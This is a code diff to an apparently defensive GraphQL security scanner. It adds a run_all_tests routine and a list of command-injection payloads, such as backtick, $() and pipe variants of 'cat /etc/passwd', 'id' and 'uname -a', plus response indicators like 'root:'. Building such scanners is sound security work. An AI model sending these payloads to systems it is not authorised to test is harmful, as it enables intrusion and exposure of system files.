@@ -337,10 +337,25 @@ class SecurityTester:
             "' UNION SELECT 1,2,3--",
             # Command injection
             "; ls -la",
+            "cat /etc/passwd",
+            ";cat /etc/passwd",
+            "|cat /etc/passwd",
+            "||cat /etc/passwd",
+            "&& cat /etc/passwd",
+            "`cat /etc/passwd`",
+            "`id`",
+            "`uname -a`",
+            "$(cat /etc/passwd)",
+            "$(id)",
+            "$(uname -a)",
+            "uname -a",
+            ";cat /etc/passwd;id",
+            "|cat /etc/passwd|id",
+            "&&cat /etc/passwd&&id",
+            "cat /etc/passwd",
+            "; cat /etc/passwd",
             "| cat /etc/passwd",
-            # NoSQL injection
-            '{\"$gt\": \"\"}',
-            '{\"$ne\": null}'
+            "&& cat /etc/passwd",
         ]
         
         # Track vulnerable fields
@@ -419,4 +434,102 @@ class SecurityTester:
                     "SQLITE_ERROR",
                     "MySQL",
                     "PostgreSQL",
-                    "E"]
+                    "ENOENT",
+                    "command not found",
+                    "EACCES",
+                    "permission denied",
+                    "root:",
+                    "/bin/bash",
+                    "invalid JSON"
+                ]
+                
+                for indicator in indicators:
+                    if indicator.lower() in response_text.lower():
+                        vulnerable_fields.append({
+                            "field": field_name,
+                            "arg": arg_name,
+                            "payload": payload,
+                            "operation": "mutation"
+                        })
+                        break
+        
+        # Update result based on findings
+        if vulnerable_fields:
+            result["vulnerable"] = True
+            result["details"] = f"Found {len(vulnerable_fields)} potential injection points"
+            result["vulnerable_fields"] = vulnerable_fields
+            self.message.printMsg(f"Potential injection vulnerability: {len(vulnerable_fields)} fields", status="warning")
+        else:
+            self.message.printTestResult("Injection Protection", vulnerable=False,
+                details="No injection vulnerabilities detected")
+            
+        return result
+        
+    async def run_all_tests(self, run_dos: bool = False) -> Dict:
+        """
+        Run all security tests and return combined results.
+        
+        Args:
+            run_dos: Whether to run DoS tests (may impact performance)
+            
+        Returns:
+            Dict: Combined test results
+        """
+        start_time = time.time()
+        
+        # Define tests to run
+        tests = [
+            self.test_introspection(),
+            self.test_get_method(),
+            self.test_csrf(),
+            self.test_batch_queries(),
+            self.test_field_suggestions(),
+            self.test_injection_vulnerability()
+        ]
+        
+        # Optionally add DoS test
+        if run_dos and self.schema:
+            tests.append(self.test_dos_vulnerability())
+            
+        # Run all tests concurrently
+        test_results = await asyncio.gather(*tests)
+        
+        # Count vulnerabilities by severity
+        high_count = 0
+        medium_count = 0
+        low_count = 0
+        vuln_count = 0
+        
+        for result in test_results:
+            if result.get("vulnerable", False):
+                vuln_count += 1
+                severity = result.get("severity", "").upper()
+                if severity == "HIGH":
+                    high_count += 1
+                elif severity == "MEDIUM":
+                    medium_count += 1
+                elif severity == "LOW":
+                    low_count += 1
+        
+        # Generate results
+        end_time = time.time()
+        scan_duration = end_time - start_time
+        
+        # Print summary
+        self.message.printScanSummary(
+            tests_run=len(test_results),
+            vulnerabilities_found=vuln_count,
+            scan_time=scan_duration
+        )
+        
+        return {
+            "tests": test_results,
+            "summary": {
+                "total": len(test_results),
+                "vulnerabilities": vuln_count,
+                "high": high_count,
+                "medium": medium_count,
+                "low": low_count,
+                "duration": scan_duration
+            }
+        }
